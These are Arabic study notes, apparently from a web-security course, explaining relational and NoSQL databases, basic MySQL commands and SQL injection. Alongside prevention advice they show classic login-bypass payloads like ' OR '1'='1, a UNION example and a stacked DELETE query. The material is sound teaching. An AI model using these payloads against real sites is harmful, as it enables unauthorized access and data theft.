# Layer 1

معظم مواقع الويب الحديثة (زي فيسبوك، أمازون، أو أي موقع فيه تسجيل دخول) بيكون وراه **Database**.

طيب يعني إيه Database؟

ببساطة هي مكان بيتخزن فيه البيانات.

مثال:

- بيانات المستخدمين
    
- كلمات السر (المفروض تكون مشفرة)
    
- المنتجات
    
- التعليقات
    
- الرسائل
    
- الطلبات
    
- أي معلومات الموقع محتاجها
    

مثلاً لو دخلت على موقع وكتبت اسم المستخدم والباسورد، الموقع لازم يروح يشوف في الداتابيز هل البيانات دي صحيحة ولا لأ.

![[Pasted image 20260618162303.png]]

---

## ازاي الموقع بيتعامل مع الداتابيز؟

المستخدم بيبعت Request.

مثلاً:

```
Username = mohab
Password = 123456
```

الـ Backend بتاع الموقع ياخد البيانات دي ويعمل Query للداتابيز.

يعني يقول للداتابيز:

```sql
SELECT * FROM users
WHERE username='mohab'
AND password='123456';
```

لو لقى المستخدم موجود يدخلّه.  
لو ملقاش يقوله البيانات غلط.

---

## شكل النظام

الشرح بيقول إن فيه 3 طبقات (Three-tier architecture).

يعني:

```
User
   |
   |
Website
(Application Server)
   |
   |
Database
```

يعني:

أنت بتكلم الموقع.

الموقع هو اللي يكلم الداتابيز.

أنت أصلاً مبتتعاملش مع الداتابيز بشكل مباشر.

وده علشان الأمان.

---

## SQL Injection

المشكلة بتحصل فين؟

لما الموقع ياخد الكلام اللي المستخدم كتبه ويحطه جوه الـ SQL Query بدون حماية.

مثلاً:

أنت كتبت:

```
mohab
```

الموقع يعمل:

```sql
SELECT * FROM users
WHERE username='mohab';
```

تمام.

لكن لو حد خبيث كتب حاجة مختلفة؟

مثلاً:

```
mohab' OR '1'='1
```

هيبقى الاستعلام:

```sql
SELECT * FROM users
WHERE username='mohab'
OR '1'='1';
```

وبما إن

```
'1'='1'
```

دايماً True

فالشرط كله يبقى True.

فتطلع كل المستخدمين.

وده اسمه SQL Injection.

---

## يعني إيه SQL Injection؟

هو إن المهاجم يدخل أوامر SQL بدل البيانات العادية، ويخلي الموقع ينفذها على الداتابيز.

بدل ما الموقع يعتبرها اسم مستخدم، يعتبرها جزء من الاستعلام.

---

## SQL

SQL اختصار:

```
Structured Query Language
```

ودي اللغة اللي بنتعامل بيها مع قواعد البيانات.

بيها نقدر:

- نقرأ بيانات
    
- نضيف بيانات
    
- نمسح بيانات
    
- نعدل بيانات
    

---

## Relational Database

الشرح قال:

> SQL injection refers to attacks against relational databases.

يعني SQL Injection بيستهدف قواعد البيانات العلائقية.

زي:

- MySQL
    
- PostgreSQL
    
- MariaDB
    
- SQL Server
    
- Oracle
    

ودي كلها بتستخدم SQL.

---

## NoSQL Injection

فيه نوع تاني اسمه NoSQL Injection.

وده بيكون ضد قواعد بيانات مش بتستخدم SQL.

زي:

- MongoDB
    
- Cassandra
    

لكن الكورس هيشرح MySQL بس.

---

## SQL Injection بيحصل إزاي؟

الشرح بيقول:

المهاجم لازم يعمل حاجتين:

1. Inject SQL code
    
2. يغير منطق الاستعلام
    

يعني يدخل كود SQL ويخلي الاستعلام النهائي مختلف عن اللي المبرمج كان قاصده.

---

## مثال

المبرمج كتب:

```sql
SELECT * FROM users
WHERE username='USER';
```

أنت المفروض تدخل:

```
Ali
```

يبقى:

```sql
SELECT * FROM users
WHERE username='Ali';
```

لكن لو دخلت:

```
Ali' OR '1'='1
```

يبقى:

```sql
SELECT * FROM users
WHERE username='Ali'
OR '1'='1';
```

وبالتالي الاستعلام اتغير.

---

## ليه بيستخدموا Single Quote؟

الشرح قال:

```
'
```

أو

```
"
```

ليه؟

علشان يخرج من حدود النص.

بص:

الموقع عامل:

```sql
username='mohab'
```

كل اللي بين علامتي الاقتباس يعتبر String.

لو المهاجم كتب:

```
mohab'
```

يبقى:

```sql
username='mohab''
```

هو كده قفل الـ String.

وبعدها يقدر يكتب أوامر SQL جديدة.

وده أساس أغلب هجمات SQL Injection.

---

## Escape user input

المقصود إن المهاجم "يهرب" من النص اللي الموقع كان متوقعه.

بدل ما يبقى:

```
username='mohab'
```

يبقى:

```
username='mohab' OR 1=1
```

فهو خرج من النص ودخل في أوامر SQL نفسها.

---

## Subvert the application logic

يعني يغير منطق الموقع.

بدل ما الموقع يقول:

"ادخل لو اليوزر والباسورد صح"

المهاجم يخليه يقول:

"ادخل أي حد."

أو:

"هاتلي كل البيانات."

أو:

"شغل أمر جديد."

---

## Original Query

يعني الاستعلام الأصلي اللي المبرمج كتبه.

مثلاً:

```sql
SELECT * FROM users
WHERE id=5;
```

المهاجم يحوله إلى:

```sql
SELECT * FROM users
WHERE id=5
OR 1=1;
```

فبقى استعلام مختلف.

---

## Stacked Queries

الشرح ذكرها كمثال.

دي فكرة إنك تشغل أكتر من Query مرة واحدة.

مثلاً:

```sql
SELECT * FROM users;
DELETE FROM users;
```

يعني أول استعلام يقرأ.

والتاني يمسح.

لكن مش كل قواعد البيانات أو التطبيقات بتسمح بده.

---

## UNION Query

دي طريقة مشهورة في SQL Injection.

بتستخدم كلمة:

```sql
UNION
```

علشان تجمع نتايج استعلامين.

مثلاً:

```sql
SELECT username FROM users
UNION
SELECT password FROM users;
```

فتطلع البيانات كلها مع بعض.

ودي من أشهر أنواع SQL Injection.

---

## Retrieve Output

بعد ما المهاجم يشغل الاستعلام، محتاج يشوف النتيجة.

يعني:

لو طلب أسماء المستخدمين.

فين هيظهروا؟

على صفحة الموقع.

أو في رسالة خطأ.

أو في API Response.

أو في أي مكان الموقع بيرجع فيه بيانات.

---

## Use Cases and Impact

يعني استخدامات SQL Injection وتأثيرها.

وده أخطر جزء.

---

## سرقة البيانات

المهاجم ممكن يجيب:

- أسماء المستخدمين
    
- الإيميلات
    
- كلمات السر
    
- أرقام التليفونات
    
- بطاقات الائتمان
    
- العناوين
    

لو موجودة في الداتابيز.

---

## Password Breaches

يعني تسريب كلمات السر.

بعد كده المهاجم يستخدمها في مواقع تانية.

لأن ناس كتير بتستخدم نفس الباسورد في كل حاجة.

---

## Login Bypass

دي من أشهر الاستخدامات.

بدل ما يعرف الباسورد الحقيقي.

يعمل SQL Injection.

ويدخل بدون كلمة سر صحيحة.

وده اسمه تجاوز تسجيل الدخول.

---

## Access Admin Panel

لو فيه لوحة تحكم خاصة بالمدير.

المهاجم ممكن يعدل الاستعلام ويخش عليها.

مع إنه مش Admin.

---

## Read Files

بعض قواعد البيانات تقدر تقرأ ملفات من السيرفر.

زي:

```
/etc/passwd
```

في لينكس.

لو الصلاحيات تسمح.

---

## Write Files

ممكن يكتب ملفات على السيرفر.

وده أخطر.

لأنه ممكن يرفع ملف PHP مثلاً.

ويبقى عنده تحكم في السيرفر.

---

## Backdoor

يعني باب خلفي.

ملف أو برنامج يسيبه على السيرفر.

يرجع يدخل منه في أي وقت.

حتى لو غيروا الباسورد.

---

## Take Control

لو الأمور وصلت لآخرها.

المهاجم ممكن يسيطر على الموقع كله.

وأحياناً على السيرفر بالكامل.

وده يعتبر من أخطر أنواع الثغرات.

---

## Prevention

يعني إزاي نحمي نفسنا من SQL Injection.

---

## السبب الأساسي

المواقع المكتوبة بشكل سيئ.

يعني المبرمج ياخد Input المستخدم ويحطه مباشرة في Query.

بدون أي حماية.

---

## Input Sanitization

يعني تنظيف البيانات.

لو المستخدم كتب:

```
'
```

الموقع يحولها لحاجة آمنة.

بحيث متبقاش جزء من SQL.

---

## Input Validation

يعني التحقق من البيانات.

مثلاً:

خانة السن المفروض رقم.

لو حد كتب:

```
abc
```

أو:

```
' OR 1=1
```

الموقع يرفضها.

---

## Proper Privileges

يعني صلاحيات قاعدة البيانات تكون محدودة.

مثلاً:

لو الموقع محتاج يقرأ بيانات فقط.

يبقى حساب الداتابيز ميقدرش يعمل:

- DELETE
    
- DROP
    
- CREATE
    

وبالتالي حتى لو حصل SQL Injection، الضرر يبقى محدود.

---

## الخلاصة

الفكرة الأساسية لـ SQL Injection هي أن الموقع يدمج مدخلات المستخدم داخل استعلام SQL بدون حماية كافية، فيقدر المهاجم يغيّر الاستعلام الأصلي ويجبر قاعدة البيانات على تنفيذ أوامر غير مقصودة، مما قد يؤدي إلى قراءة بيانات حساسة أو تجاوز تسجيل الدخول أو تنفيذ عمليات أخطر حسب صلاحيات قاعدة البيانات والتطبيق.


# Layer 2
## Types of Databases

يعني **أنواع قواعد البيانات**.

بشكل عام قواعد البيانات نوعين:

1. **Relational Databases (قواعد بيانات علائقية)**
    
2. **Non-Relational Databases أو NoSQL Databases**
    

الفرق الأساسي بينهم هو طريقة تخزين البيانات وطريقة التعامل معاها.

---

## Relational Databases

دي أشهر نوع قواعد بيانات في العالم.

تقريبًا أغلب المواقع الكبيرة والأنظمة القديمة والحديثة بتستخدمها.

اسمها Relational يعني "علاقية" لأنها بتربط البيانات ببعض عن طريق علاقات (Relationships).

---

## It uses a schema

الشرح بيقول إنها بتستخدم **Schema**.

طيب يعني إيه Schema؟

الـ Schema هو التصميم أو المخطط بتاع قاعدة البيانات.

يعني قبل ما تخزن أي بيانات، لازم تحدد:

- هتخزن إيه؟
    
- أسماء الأعمدة إيه؟
    
- نوع كل عمود إيه؟
    
- العلاقات بين الجداول إيه؟
    

مثال:

عندك جدول للمستخدمين:

|id|username|age|
|---|---|---|
|1|Mohab|21|
|2|Ali|25|

هنا الـ Schema بيقول:

- id رقم
    
- username نص
    
- age رقم
    

مينفعش فجأة تيجي تحط صورة في خانة age.

لازم تمشي على التصميم.

---

## Template

لما يقول:

> It uses a template

يعني بيستخدم قالب ثابت.

كل البيانات لازم تمشي على نفس القالب.

---

## مثال شركة بتبيع منتجات

الشرح ضرب مثال بشركة بتبيع منتجات.

الشركة محتاجة تعرف:

- العملاء
    
- المنتجات
    
- الطلبات
    
- الكميات
    
- الأسعار
    

بدل ما تحط كل ده في جدول واحد ضخم، بتقسمهم.

---

## جدول العملاء

|id|name|phone|
|---|---|---|
|1|Mohab|010|
|2|Ahmed|011|

---

## جدول المنتجات

|id|product|price|
|---|---|---|
|10|Laptop|30000|
|11|Mouse|500|

---

## جدول الطلبات

|customer_id|product_id|quantity|
|---|---|---|
|1|10|2|
|2|11|1|

كل جدول ليه وظيفة.

---

## Tables

الجداول هي المكان اللي البيانات بتتخزن فيه.

كل جدول بيحتوي على:

- Rows (صفوف)
    
- Columns (أعمدة)
    

زي Excel بالظبط.

---

## Keys

الشرح قال:

> Tables are associated with keys

يعني الجداول فيها مفاتيح.

ودي مهمة جدًا.

---

## Primary Key

أشهر نوع هو Primary Key.

وده رقم مميز لكل صف.

مثلاً:

|id|username|
|---|---|
|1|Mohab|
|2|Ali|
|3|Omar|

الـ id هنا مفيش اتنين زيه.

وده بيسهل الوصول للبيانات.

---

## Entities

الشرح قال:

> These tables are also called entities

يعني كل جدول بيمثل كيان.

مثلاً:

- Users Entity
    
- Products Entity
    
- Orders Entity
    

كل واحد مسئول عن نوع معين من البيانات.

---

## Tables are related

الجداول مرتبطة ببعض.

مثلاً:

جدول المستخدمين:

|id|name|
|---|---|
|1|Mohab|
|2|Ali|

وجدول الطلبات:

|order|user_id|
|---|---|
|500|1|
|501|2|

لاحظ إن user_id بيرجع لجدول المستخدمين.

فهو رابط الجدولين ببعض.

---

## Customer ID

بدل ما يكرر اسم العميل وعنوانه في كل طلب، يحط:

```text
customer_id = 5
```

ولما يحتاج الاسم يروح يجيبه من جدول العملاء.

وده يوفر مساحة ويحافظ على تنظيم البيانات.

---

## Product ID

نفس الفكرة.

بدل ما يكرر:

```text
Laptop
30000
Dell
Black
```

في كل عملية شراء،

يحط:

```text
product_id = 15
```

وبعدين يجيب باقي البيانات من جدول المنتجات.

---

## Any change affects all tables

يعني لو غيرت اسم المنتج في جدول المنتجات، هيتغير تلقائيًا في كل الطلبات المرتبطة بيه.

وده ميزة كبيرة.

---

## RDBMS

الشرح ذكر مصطلح مهم جدًا:

**Relational Database Management System**

اختصارها:

```text
RDBMS
```

يعني نظام إدارة قواعد البيانات العلائقية.

وده البرنامج اللي بيدير الجداول والعلاقات والاستعلامات.

---

## أمثلة على RDBMS

زي:

- Microsoft Access
    
- MySQL
    
- SQL Server
    
- Oracle
    
- PostgreSQL
    

كل دول برامج لإدارة قواعد البيانات.

---

## مثال users table

الشرح بيقول:

فيه جدول اسمه:

```text
users
```

فيه أعمدة:

- id
    
- username
    
- first_name
    
- last_name
    

مثلاً:

|id|username|first_name|last_name|
|---|---|---|---|
|1|mohab|Mohab|Nasser|

---

## posts table

وجدول تاني:

```text
posts
```

فيه:

- id
    
- user_id
    
- date
    
- content
    

مثلاً:

|id|user_id|date|content|
|---|---|---|---|
|1|1|18-6|Hello|

---

## user_id

لاحظ إن جدول البوستات مش مخزن اسم المستخدم.

هو مخزن:

```text
user_id = 1
```

بس.

---

## ليه؟

علشان يقلل التكرار.

بدل:

|post|username|
|---|---|
|Hello|Mohab|
|Test|Mohab|
|Hi|Mohab|

هيستخدم رقم واحد فقط.

---

## Linking Tables

يعني ربط الجداول.

لما أحب أعرف مين صاحب البوست:

أشوف:

```text
user_id=1
```

وأروح جدول users.

ألاقي:

```text
id=1
```

يبقى صاحبه Mohab.

---

## One table can have more than one key

يعني الجدول ممكن يبقى فيه أكتر من مفتاح.

مثلاً:

Posts

|id|user_id|
|---|---|
|100|1|

الـ id بيربط مع جدول التعليقات.

والـ user_id بيربط مع جدول المستخدمين.

---

## Comments table

مثلاً:

|id|post_id|comment|
|---|---|---|
|1|100|Nice|

هنا:

```text
post_id
```

بيرجع لجدول Posts.

---

## Schema

الشرح قال:

> The relationship between tables is called Schema.

المقصود إن الـ Schema مش بس شكل الجداول.

لكن كمان العلاقات بينهم.

يعني مين مربوط بمين.

---

## ليه Relational Databases قوية؟

لأنك تقدر تجيب بيانات من كذا جدول مرة واحدة.

مثلاً:

هات:

- اسم العميل
    
- كل الطلبات
    
- المنتجات
    
- الأسعار
    

في Query واحدة.

وده بيخليها سريعة جدًا مع البيانات المنظمة.

---

## Big datasets

يعني كمية بيانات ضخمة.

ملايين المستخدمين.

وملايين الطلبات.

وبرضو تشتغل بكفاءة.

---

## Efficient Data Management

يعني إدارة البيانات بكفاءة.

- سهلة
    
- منظمة
    
- سريعة
    
- قليلة التكرار
    

---

## أشهر مثال

أشهر Relational Database:

**MySQL**

وده اللي هيتشرح عليه SQL Injection في الكورس.

---

## Non-relational Databases

النوع التاني اسمه:

Non-relational Database

أو:

NoSQL Database

---

## الفرق الأساسي

النوع ده **مش بيستخدم جداول بالشكل التقليدي**.

يعني مفيش:

- Rows
    
- Columns
    
- Primary Keys
    
- Schema ثابت
    

---

## No Schema

الميزة هنا إنك مش لازم تحدد شكل البيانات من الأول.

كل Record ممكن يبقى مختلف.

---

مثلاً:

واحد مستخدم:

```json
{
"name":"Mohab"
}
```

واحد تاني:

```json
{
"name":"Ali",
"age":25,
"phone":"010"
}
```

مفيش مشكلة.

مع إنهم مختلفين.

وده مينفعش في Relational Database.

---

## Flexible

يعني مرنة جدًا.

تقدر تضيف بيانات جديدة بسهولة.

---

## Scalable

يعني تقدر تكبر بسهولة جدًا.

عشان كده شركات كبيرة زي فيسبوك ونتفليكس وغيرهم بيستخدموا NoSQL في أجزاء من أنظمتهم.

---

## Storage Models

الشرح قال فيه أربع طرق للتخزين.

---

## 1- Key-Value

أبسط نوع.

بيخزن:

```text
Key -> Value
```

زي Dictionary في Python.

مثلاً:

```text
1001 -> Mohab
1002 -> Ali
```

---

## 2- Document-Based

بيخزن Documents.

زي JSON.

وده أشهر نوع.

---

## 3- Wide Column

بيشبه الجداول لكن مرن جدًا.

وبيستخدم مع البيانات الضخمة.

---

## 4- Graph

بيعتمد على Nodes وEdges.

وبيستخدم في العلاقات المعقدة.

زي شبكات التواصل الاجتماعي.

---

## مثال Key-Value

الشرح جاب المثال ده:

```json
{
 "100001":{
   "date":"01-01-2021",
   "content":"Welcome"
 }
}
```

هنا:

المفتاح:

```text
100001
```

والقيمة:

```json
{
"date":"01-01-2021",
"content":"Welcome"
}
```

يعني كل مفتاح مرتبط ببياناته.

---

## JSON

هو شكل لتخزين البيانات.

بيستخدم:

```text
Key : Value
```

مثال:

```json
{
"name":"Mohab",
"age":21
}
```

وده مستخدم بكثرة في الـ APIs وقواعد بيانات NoSQL.

---

## Dictionary

الشرح قال إنه شبه Dictionary في Python.

مثلاً:

```python
student={
"name":"Mohab",
"age":21
}
```

"name" ده Key.

و"Mohab" هي Value.

---

## أشهر NoSQL Database

أشهر واحدة هي:

**MongoDB**

وهي معتمدة على Documents (JSON).

---

## NoSQL Injection

زي ما فيه SQL Injection،

فيه كمان:

NoSQL Injection.

لكن طريقته مختلفة تمامًا.

لأن قاعدة البيانات نفسها مختلفة.

الكورس هيشرحه بعدين.

---

## الخلاصة

- **Relational Database** بتخزن البيانات في جداول مترابطة، ولها **Schema** ثابت وعلاقات بين الجداول باستخدام **Keys**، وأشهر مثال عليها **MySQL**.
    
- **NoSQL Database** لا تعتمد على الجداول التقليدية، وتخزن البيانات بطرق مختلفة مثل **Key-Value** أو **Documents (JSON)**، وهي أكثر مرونة وقابلة للتوسع، وأشهر مثال عليها **MongoDB**.
    
- بما إن SQL Injection بيستهدف قواعد البيانات العلائقية، فأسلوب الهجوم على قواعد بيانات NoSQL بيكون مختلف ويسمى **NoSQL Injection**.

--------
# Layer 3
## SQL Syntax

كلمة Syntax معناها:

"قواعد كتابة اللغة".

زي الجرامر في الإنجليزي.

كل Database ليها Syntax بسيط مختلف، لكن كلهم قريبين جدًا من بعض.

مثلاً:

- MySQL
    
- SQL Server
    
- Oracle
    

كلهم بيستخدموا SQL، لكن فيه اختلافات بسيطة.

---

## ISO Standard

الشرح قال إن SQL لازم تتبع معيار اسمه ISO.

يعني فيه قواعد عامة لكل قواعد البيانات لازم تلتزم بيها.

لكن كل شركة بتضيف شوية حاجات خاصة بيها.

---

## SQL can perform

SQL تقدر تعمل حاجات كتير.

---

## Retrieve Data

يعني تجيب بيانات.

مثلاً:

```sql
SELECT * FROM users;
```

هات كل المستخدمين.

---

## Update Data

يعني تعدل بيانات.

مثلاً:

```sql
UPDATE users
SET age=25
WHERE id=1;
```

غير العمر لـ 25.

---

## Delete Data

يعني تمسح بيانات.

```sql
DELETE FROM users
WHERE id=1;
```

امسح المستخدم رقم 1.

---

## Create Tables

يعني تنشئ جدول جديد.

```sql
CREATE TABLE users();
```

---

## Create Databases

تنشئ قاعدة بيانات جديدة.

```sql
CREATE DATABASE shop;
```

---

## Add Users

تضيف مستخدم جديد للداتابيز نفسها.

مش مستخدم الموقع.

لا مستخدم يقدر يدخل على قاعدة البيانات.

---

## Assign Permissions

تحدد صلاحيات كل مستخدم.

مثلاً:

- يقرأ فقط
    
- يكتب فقط
    
- يحذف
    
- يعدل
    
- يعمل كل حاجة
    

---

## Command Line

إزاي ندخل على MySQL؟

عن طريق برنامج اسمه:

```
mysql
```

---

## mysql -u root -p

يعني:

```
mysql
```

شغل برنامج MySQL.

---

```
-u
```

اختصار:

User

يعني اسم المستخدم.

---

```
root
```

هو المدير الرئيسي للداتابيز.

عنده كل الصلاحيات.

زي Administrator في ويندوز.

---

```
-p
```

يعني Password.

لكن من غير ما تكتب الباسورد بعده.

---

لما تكتب:

```bash
mysql -u root -p
```

هيقولك:

```
Enter password:
```

وتكتبها بعدها.

---

## ليه منكتبش الباسورد في الكوماند؟

يعني بدل:

```bash
mysql -u root -p
```

تكتب:

```bash
mysql -u root -ppassword
```

الشرح بيقول متعملش كده.

ليه؟

لأن الباسورد ممكن يتسجل في:

- Terminal History
    
- Logs
    
- bash_history
    

وأي حد يشوفه.

---

## Tip

بيقول:

مفيش Space بين

```
-p
```

والباسورد.

صح:

```bash
-p1234
```

غلط:

```bash
-p 1234
```

---

## root user

هو أعلى مستخدم في قاعدة البيانات.

يقدر:

- يعمل قواعد بيانات
    
- يحذف قواعد بيانات
    
- يعمل Users
    
- يغير Passwords
    
- يدي صلاحيات
    
- يشيل صلاحيات
    

كل حاجة.

---

## SHOW GRANTS

ده أمر مهم جدًا.

بيعرض صلاحيات المستخدم الحالي.

مثلاً:

```sql
SHOW GRANTS;
```

هيقولك:

هل تقدر:

- SELECT
    
- INSERT
    
- DELETE
    
- UPDATE
    
- CREATE
    

ولا لأ.

---

## localhost

لما متحددش Host.

MySQL يفترض إن الداتابيز على نفس الجهاز.

يعني:

```
127.0.0.1
```

أو

```
localhost
```

---

## Remote Host

لو الداتابيز على جهاز تاني.

لازم تحدد:

```
-h
```

يعني Host.

---

مثلاً:

```bash
mysql -u root -h 192.168.1.10 -p
```

يعني اتصل بالسيرفر ده.

---

## Port

كل Service ليها Port.

MySQL افتراضيًا بيستخدم:

```
3306
```

---

علشان تحدده:

```
-P
```

كابيتال.

---

مثال:

```bash
mysql -u root -h server.com -P 3306 -p
```

---

## ليه P كبيرة؟

لأن:

```
-p
```

Password

بينما:

```
-P
```

Port

وده فرق مهم جدًا.

---

## Creating Database

نعمل قاعدة بيانات جديدة.

الأمر:

```sql
CREATE DATABASE users;
```

يعني:

اعمل Database اسمها users.

---

## Query OK

لما يطلع:

```
Query OK
```

يعني الأمر نجح.

---

## Semicolon ;

الشرح قال:

كل Query لازم تنتهي بـ

```
;
```

ليه؟

علشان MySQL تعرف إن الأمر خلص.

مثلاً:

```sql
SELECT * FROM users;
```

بدونها:

```sql
SELECT * FROM users
```

هيفضل مستني تكمل.

---

## SHOW DATABASES

يعرض كل قواعد البيانات.

```sql
SHOW DATABASES;
```

النتيجة:

```
mysql
users
sys
performance_schema
```

وهكذا.

---

## USE

لو عندك أكتر من Database.

لازم تختار واحدة.

مثلاً:

```sql
USE users;
```

يعني:

اشتغل على Database اسمها users.

---

## Database changed

يعني خلاص بقيت شغال عليها.

---

## SQL Case Sensitive

الكلمات نفسها مش حساسة لحالة الأحرف.

يعني:

```sql
SELECT
```

زي:

```sql
select
```

وزي:

```sql
SeLeCt
```

كلهم نفس الحاجة.

---

لكن أسماء قواعد البيانات والجداول ممكن تكون Case Sensitive حسب النظام.

يعني:

```
users
```

غير:

```
USERS
```

---

عشان كده الأفضل تكتب أوامر SQL بحروف كبيرة.

---

## Tables

الداتابيز بتخزن البيانات في Tables.

يعني جداول.

زي Excel.

---

مثال:

|id|username|
|---|---|
|1|Mohab|
|2|Ali|

---

## Rows

الصفوف الأفقية.

كل صف يمثل Record.

مثلاً:

```
1 Mohab
```

ده Row.

---

## Columns

الأعمدة الرأسية.

زي:

```
id
username
password
```

---

## Cell

تقاطع الصف مع العمود.

يعني الخلية الواحدة.

مثلاً:

```
Mohab
```

دي Cell.

---

## Data Type

كل عمود له نوع بيانات.

---

## INT

رقم صحيح.

```
1
20
500
```

---

## VARCHAR

نص.

```
Mohab
Ahmed
```

---

## DATETIME

تاريخ ووقت.

```
2026-06-18 10:30
```

---

## Binary

بيانات ثنائية.

زي الصور والملفات.

---

# CREATE TABLE

علشان تعمل جدول.

```sql
CREATE TABLE logins
```

يعني:

اعمل جدول اسمه logins.

---

# داخل الأقواس

كتب:

```sql
id INT
```

يعني:

عمود اسمه id.

نوعه Integer.

---

```
username VARCHAR(100)
```

يعني:

اسم المستخدم.

نص.

أقصى طول 100 حرف.

---

```
password VARCHAR(100)
```

كلمة السر.

100 حرف.

---

```
date_of_joining DATETIME
```

تاريخ الانضمام.

---

# SHOW TABLES

يعرض كل الجداول الموجودة.

```sql
SHOW TABLES;
```

---

# DESCRIBE

يعرض تفاصيل الجدول.

```sql
DESCRIBE logins;
```

النتيجة:

- اسم العمود
    
- نوعه
    
- خصائصه
    

---

# Table Properties

يعني خصائص الأعمدة.

ودي مهمة جدًا.

---

# AUTO_INCREMENT

دي من أهم الخصائص.

يعني الرقم يزيد تلقائيًا.

مثلاً:

أول مستخدم:

```
id=1
```

تاني:

```
id=2
```

تالت:

```
id=3
```

من غير ما تكتبه بنفسك.

---

# NOT NULL

يعني العمود مينفعش يبقى فاضي.

لازم يتحط فيه قيمة.

مثلاً:

```
username
```

لازم يتملى.

---

# UNIQUE

يعني القيمة لازم تكون مميزة.

مينفعش تتكرر.

مثلاً:

```
mohab
```

لو موجودة.

مينفعش تضيف:

```
mohab
```

تاني.

---

# DEFAULT

يعني قيمة افتراضية.

لو المستخدم مدخلش حاجة.

يحط القيمة دي.

---

مثال:

```sql
DEFAULT NOW()
```

يعني حط الوقت الحالي تلقائيًا.

---

# NOW()

دالة في MySQL.

بترجع:

التاريخ والوقت الحالي.

مثلاً:

```
2026-06-18 20:45:10
```

---

# PRIMARY KEY

دي أهم خاصية في الجدول.

هي المفتاح الأساسي.

لازم:

- يكون Unique
    
- ميبقاش Null
    

وبيستخدم للوصول لأي صف بسهولة.

---

مثلاً:

|id|username|
|---|---|
|1|Mohab|
|2|Ali|

الـ id هو Primary Key.

---

# الشكل النهائي للجدول

```sql
CREATE TABLE logins(
id INT NOT NULL AUTO_INCREMENT,
username VARCHAR(100) UNIQUE NOT NULL,
password VARCHAR(100) NOT NULL,
date_of_joining DATETIME DEFAULT NOW(),
PRIMARY KEY(id)
);
```

يعني:

- id رقم يزيد تلقائيًا ولا يمكن يكون فارغ، وهو المفتاح الأساسي.
    
- username نص حتى 100 حرف، لازم يكون موجود ومينفعش يتكرر.
    
- password نص حتى 100 حرف ولازم يكون موجود.
    
- date_of_joining بيتسجل تلقائيًا بتاريخ ووقت الإضافة لو محددتش قيمة.
    

## ملخص سريع

- **SQL** هي اللغة اللي بنتعامل بيها مع قواعد البيانات.
    
- **MySQL** هو أشهر نظام لإدارة قواعد البيانات اللي بيستخدم SQL.
    
- **Database** بتحتوي على **Tables**.
    
- **Table** عبارة عن **Rows** و **Columns**.
    
- كل **Column** له **Data Type** معين.
    
- أوامر مهمة جدًا:
    
    - `CREATE DATABASE` لإنشاء قاعدة بيانات.
        
    - `SHOW DATABASES` لعرض قواعد البيانات.
        
    - `USE` لاختيار قاعدة بيانات.
        
    - `CREATE TABLE` لإنشاء جدول.
        
    - `SHOW TABLES` لعرض الجداول.
        
    - `DESCRIBE` لمعرفة تفاصيل الجدول.
        
- أهم خصائص الأعمدة:
    
    - `AUTO_INCREMENT`
        
    - `NOT NULL`
        
    - `UNIQUE`
        
    - `DEFAULT`
        
    - `PRIMARY KEY`
        

لو أنت بتذاكر SQL Injection، فكل المفاهيم دي هتبقى الأساس اللي هتبني عليه فهمك للاستعلامات واستغلال الثغرات بعد كده.

# Layer 4

---

# SQL Statements

يعني **أوامر SQL**.

SQL عبارة عن لغة فيها مجموعة أوامر، كل أمر ليه وظيفة معينة.

زي مثلاً في لينكس عندك:

```bash
ls
cd
mkdir
rm
```

وفي SQL عندك:

```sql
SELECT
INSERT
UPDATE
DELETE
DROP
ALTER
```

كل واحد بيعمل حاجة مختلفة.

---

# INSERT Statement

كلمة **INSERT** معناها:

**إدخال بيانات جديدة.**

يعني تضيف Record جديد داخل جدول.

---

## الصيغة العامة

```sql
INSERT INTO table_name
VALUES(value1,value2,value3,...);
```

خلينا نفهمها كلمة كلمة.

---

### INSERT

يعني أضف.

---

### INTO

يعني داخل.

---

### table_name

اسم الجدول.

مثلاً:

```text
logins
```

---

### VALUES

القيم اللي هتدخلها.

---

## مثال

```sql
INSERT INTO logins
VALUES(1,'admin','p@ssw0rd','2020-07-02');
```

يعني:

ضيف صف جديد في جدول logins.

القيم هي:

```
id = 1
username = admin
password = p@ssw0rd
date = 2020-07-02
```

---

يبقى الجدول هيبقى:

|id|username|password|date|
|---|---|---|---|
|1|admin|p@ssw0rd|2020-07-02|

---

# لازم تدخل كل الأعمدة؟

في الطريقة دي آه.

لازم تدخل قيمة لكل عمود.

حتى لو مش محتاجها.

---

# إدخال أعمدة معينة فقط

ممكن تحدد الأعمدة بنفسك.

الصيغة:

```sql
INSERT INTO table_name(column1,column2)
VALUES(value1,value2);
```

---

مثال:

```sql
INSERT INTO logins(username,password)
VALUES('administrator','adm1n_p@ss');
```

لاحظ هنا إننا مدخلناش:

- id
    
- date_of_joining
    

---

# ليه سابهم؟

لأنهم عندهم قيم افتراضية.

مثلًا:

```
id
```

بيزيد تلقائيًا بـ AUTO_INCREMENT.

و

```
date_of_joining
```

بياخد الوقت الحالي بـ DEFAULT NOW().

---

النتيجة هتبقى:

|id|username|password|date|
|---|---|---|---|
|1|admin|pass|2020|
|2|administrator|adm1n_p@ss|Now()|

---

# NOT NULL

لو العمود عليه:

```sql
NOT NULL
```

مينفعش تسيبه.

لازم تديله قيمة.

---

مثلاً:

```
username
```

لو عليه NOT NULL.

وعملت:

```sql
INSERT INTO logins(password)
VALUES('123');
```

هيطلع Error.

لأن username مطلوب.

---

# Cleartext Password

الشرح قال:

```
The examples insert cleartext passwords
```

يعني بيخزن الباسورد كنص عادي.

وده غلط.

---

ليه غلط؟

لأن لو الداتابيز اتسربت.

أي حد هيشوف:

```
admin
123456
```

وده خطر.

---

المفروض الباسورد يتخزن:

```
Hashed
```

يعني مشفر بطريقة One-Way.

زي:

```
$2y$10$hfj394834...
```

---

# إدخال أكتر من صف مرة واحدة

بدل:

```sql
INSERT INTO logins(username,password)
VALUES('john','123');
```

وبعدين:

```sql
INSERT INTO logins(username,password)
VALUES('tom','456');
```

تقدر تعمل الاتنين مرة واحدة:

```sql
INSERT INTO logins(username,password)
VALUES
('john','john123!'),
('tom','tom123!');
```

---

هيضيف:

|username|password|
|---|---|
|john|john123!|
|tom|tom123!|

مرة واحدة.

---

# SELECT Statement

أهم أمر في SQL كله تقريبًا.

بيستخدم لاسترجاع البيانات.

---

كلمة:

```
SELECT
```

يعني:

اختار.

أو

هات.

---

## الصيغة

```sql
SELECT *
FROM table;
```

---

# *

النجمة معناها:

كل الأعمدة.

يعني:

```
All Columns
```

---

مثال:

```sql
SELECT *
FROM logins;
```

يعني:

هات كل البيانات الموجودة في الجدول.

---

النتيجة:

|id|username|password|date|
